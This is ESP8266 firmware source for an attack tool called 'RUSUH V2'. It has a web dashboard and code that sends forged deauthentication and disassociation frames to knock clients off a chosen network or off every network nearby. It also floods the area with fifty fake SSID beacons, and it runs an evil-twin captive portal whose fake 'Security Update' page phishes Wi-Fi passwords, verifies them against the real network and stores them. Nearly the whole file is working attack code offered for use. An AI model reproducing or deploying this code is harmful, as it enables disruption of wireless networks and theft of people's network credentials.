#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

extern "C" {
#include "user_interface.h"
}

// --- CONFIG ---
const char* ADMIN_SSID = "GMpro";
const char* ADMIN_PASS = "Sangkur87";

typedef struct { String ssid; uint8_t ch; uint8_t bssid[6]; } _Network;
_Network _networks[16];
_Network _selectedNetwork;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String _correct = "";
String _tryPassword = "";
String _lastLog = "Sistem Ready";
uint32_t _pktCount = 0;

bool hotspot_active = false;
bool mass_kill_active = false;
bool deauth_target_active = false;
bool beacon_spam_active = false;

unsigned long last_attack = 0;

const char* fake_ssids_50[] = {
  "iPhone 13", "AndroidAP_9921", "Xiaomi Mi 11", "Galaxy S21 Ultra", "OPPO A95", 
  "Rumah_WiFi", "TP-Link_9920", "Tenda_F3_New", "MNC_Play_Ext", "Biznet_Home_5G",
  "Family_WiFi", "Guest_WiFi", "Printer_Epson_L3110", "CCTV_Home", "Vivo_V20",
  "Hotspot_Pribadi", "IndiHome-8822", "Linksys_Smart", "D-Link_DIR", "ASUS_Router",
  "Cafe_Free_WiFi", "Meeting_Room", "Staff_Only", "Smart_Home_Hub", "Realme_C25",
  "iPhone 12 Mini", "Samsung_Tab_S7", "Huawei_P40", "My_WiFi", "Netgear_Pro",
  "Dapur_WiFi", "Kamar_Atas", "WiFi_Kenceng", "Jaringan_Gratis", "Admin_WiFi",
  "Public_Hotspot", "Telkomsel_Orbit", "XL_Home_Fiber", "Oxygen_Home", "CBN_Fiber",
  "Starlink_Gen2", "Google_Fiber", "Sony_Bravia_TV", "LG_Smart_ThinQ", "Xbox_Live",
  "PlayStation_Network", "Nintendo_Switch", "Tesla_Car_WiFi", "Guest_Access", "User_WiFi"
};

// --- EEPROM HELPERS ---
void savePassword(String pw) {
  for (int i = 0; i < pw.length(); ++i) EEPROM.write(i, pw[i]);
  EEPROM.write(pw.length(), '\0');
  EEPROM.commit();
}

String loadPassword() {
  String pw = "";
  for (int i = 0; i < 32; ++i) {
    char c = char(EEPROM.read(i));
    if (c == '\0') break;
    pw += c;
  }
  return pw;
}

// --- ATTACK ENGINE ---
void sendPkt(uint8_t* buf, uint16_t len) {
  if (wifi_send_pkt_freedom(buf, len, 0) == 0) _pktCount++;
  yield();
}

void deauthAction(uint8_t* bssid, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t pkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x01, 0x00};
  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);
  sendPkt(pkt, 26);
  pkt[0] = 0xA0; // Disassociate
  sendPkt(pkt, 26);
}

void sendBeacon(const char* ssid) {
  uint8_t packet[128];
  int ssid_len = strlen(ssid);
  uint8_t header[] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x00 };
  memcpy(packet, header, sizeof(header));
  int pos = sizeof(header);
  packet[pos++] = 0x00; packet[pos++] = ssid_len;
  memcpy(&packet[pos], ssid, ssid_len); pos += ssid_len;
  uint8_t rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c };
  memcpy(&packet[pos], rates, sizeof(rates)); pos += sizeof(rates);
  sendPkt(packet, pos);
}

// --- ADMIN DASHBOARD ---
void handleAdmin() {
  if (webServer.hasArg("scan")) {
    _lastLog = "Scanning WiFi...";
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      _networks[i].ch = WiFi.channel(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    }
    _lastLog = "Scan Berhasil (" + String(n) + " ditemukan)";
  }

  if (webServer.hasArg("ap")) {
    int idx = webServer.arg("ap").toInt();
    if(idx >= 0 && idx < 16) {
      _selectedNetwork = _networks[idx];
      _lastLog = "Terkunci: " + _selectedNetwork.ssid;
    }
  }

  if (webServer.hasArg("deauth")) { deauth_target_active = (webServer.arg("deauth") == "1"); _pktCount = 0; if(deauth_target_active) _lastLog = "Deauthing " + _selectedNetwork.ssid; }
  if (webServer.hasArg("kill")) { mass_kill_active = (webServer.arg("kill") == "1"); _pktCount = 0; if(mass_kill_active) _lastLog = "Mass Killing Active"; }
  if (webServer.hasArg("spam")) { beacon_spam_active = (webServer.arg("spam") == "1"); _pktCount = 0; if(beacon_spam_active) _lastLog = "SSID Spamming Active"; }
  if (webServer.hasArg("stop")) { deauth_target_active = mass_kill_active = beacon_spam_active = hotspot_active = false; _lastLog = "Serangan Berhenti"; }
  if (webServer.hasArg("clear")) { for (int i = 0; i < 512; i++) EEPROM.write(i, 0); EEPROM.commit(); _correct = ""; _lastLog = "Data Dihapus"; }
  
  if (webServer.hasArg("hotspot")) {
    hotspot_active = (webServer.arg("hotspot") == "1");
    if(hotspot_active && _selectedNetwork.ssid != "") {
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      _lastLog = "Evil Twin Aktif";
    } else {
      hotspot_active = false;
      WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
      _lastLog = "Admin Mode On";
    }
  }

  String h = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>";
  h += "body{background:#000;color:#fff;font-family:sans-serif;padding:10px;margin:0;}h2{color:#00d4ff;border-bottom:2px solid #222;padding-bottom:10px;}";
  h += "button{width:100%;padding:15px;margin:5px 0;border:none;border-radius:5px;font-weight:bold;color:#fff;cursor:pointer;text-transform:uppercase;}";
  h += ".r{background:#f44336;}.p{background:#9c27b0;}.b{background:#2196f3;}.g{background:#444;}.y{background:#ffa000;}.s{background:#00c853;}";
  h += ".active{border:2px solid #fff;box-shadow:0 0 15px #fff;}.result-box{background:#2e7d32;padding:12px;border-radius:5px;margin-bottom:15px;display:flex;justify-content:space-between;align-items:center;}";
  h += ".log{background:#111;color:#0f0;padding:10px;font-family:monospace;font-size:12px;margin:10px 0;border:1px solid #333;border-radius:5px;}";
  h += "table{width:100%;border-collapse:collapse;margin-top:15px;}th,td{padding:10px;border-bottom:1px solid #333;text-align:left;font-size:13px;}th{background:#111;color:#00d4ff;}";
  h += ".sel-btn{background:#00d4ff !important;color:#000 !important;font-weight:900;}</style></head><body>";
  
  h += "<h2>RUSUH V2 (GMpro)</h2>";
  if(_correct != "") h += "<div class='result-box'><span>RESULT: <b>"+_correct+"</b></span><button class='y' style='width:auto;padding:5px 10px;' onclick=\"location.href='/?clear=1'\">HAPUS</button></div>";
  h += "<p>Target: <b>"+_selectedNetwork.ssid+"</b></p>";
  
  h += "<button class='r "+String(deauth_target_active?"active":"")+"' onclick=\"location.href='/?deauth="+(deauth_target_active?"0":"1")+"'\">DEAUTH TARGET</button>";
  h += "<button class='r "+String(mass_kill_active?"active":"")+"' onclick=\"location.href='/?kill="+(mass_kill_active?"0":"1")+"'\">MASS KILL ALL</button>";
  
  h += "<div class='log'>Status: "+_lastLog+"<br>Pkt Sent: "+String(_pktCount)+"</div>";
  
  h += "<button class='p "+String(beacon_spam_active?"active":"")+"' onclick=\"location.href='/?spam="+(beacon_spam_active?"0":"1")+"'\">SPAM 50 SSID</button>";
  h += "<button class='b "+String(hotspot_active?"active":"")+"' onclick=\"location.href='/?hotspot="+(hotspot_active?"0":"1")+"'\">EVIL TWIN</button>";
  h += "<button class='g' onclick=\"location.href='/?stop=1'\">🛑 STOP ALL ATTACKS</button>";
  
  h += "<button class='s' onclick=\"location.href='/?scan=1'\">🔍 SCAN WIFI SEKITAR</button>";

  h += "<table><thead><tr><th>SSID</th><th>CH</th><th>AKSI</th></tr></thead><tbody>";
  for(int i=0; i<16; i++){
    if(_networks[i].ssid == "") break;
    bool isSel = (_networks[i].ssid == _selectedNetwork.ssid);
    h += "<tr><td>"+_networks[i].ssid+"</td><td>"+String(_networks[i].ch)+"</td><td><button class='g "+(isSel?"sel-btn":"")+"' style='width:auto;padding:5px 10px;' onclick=\"location.href='/?ap="+String(i)+"'\">"+(isSel?"SELECTED":"SELECT")+"</button></td></tr>";
  }
  h += "</tbody></table></body></html>";
  webServer.send(200, "text/html", h);
}

void setup() {
  EEPROM.begin(512);
  _correct = loadPassword();
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
  dnsServer.start(DNS_PORT, "*", apIP);
  
  webServer.on("/", [](){
    if (hotspot_active) {
      if (webServer.hasArg("password")) {
        _tryPassword = webServer.arg("password");
        WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str());
        webServer.send(200, "text/html", "Verifying... <script>setTimeout(function(){location.href='/check';},5000);</script>");
      } else {
        webServer.send(200, "text/html", "<html><body style='font-family:sans-serif;padding:20px;background:#000;color:#fff;'><h2>Security Update</h2><p>Verifikasi untuk <b>"+_selectedNetwork.ssid+"</b></p><form method='post'><input type='password' name='password' style='width:100%;padding:10px;' placeholder='Masukkan Password WiFi'><br><br><input type='submit' value='UPDATE' style='width:100%;padding:10px;background:#2196f3;color:#fff;border:none;'></form></body></html>");
      }
    } else { handleAdmin(); }
  });

  webServer.on("/check", [](){
    if(WiFi.status() == WL_CONNECTED) { 
      _correct = _tryPassword; 
      savePassword(_correct); 
      deauth_target_active = mass_kill_active = beacon_spam_active = hotspot_active = false;
      WiFi.disconnect();
      WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
    }
    webServer.send(200, "text/html", "<script>location.href='/';</script>");
  });
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if ((mass_kill_active || beacon_spam_active || deauth_target_active) && millis() - last_attack > 400) {
    if (deauth_target_active && _selectedNetwork.ssid != "") deauthAction(_selectedNetwork.bssid, _selectedNetwork.ch);
    if (mass_kill_active) {
      for (int i = 0; i < 16; i++) if (_networks[i].ch != 0) deauthAction(_networks[i].bssid, _networks[i].ch);
    }
    if (beacon_spam_active) {
      for (int i = 0; i < 50; i++) sendBeacon(fake_ssids_50[i]);
    }
    last_attack = millis();
  }
}
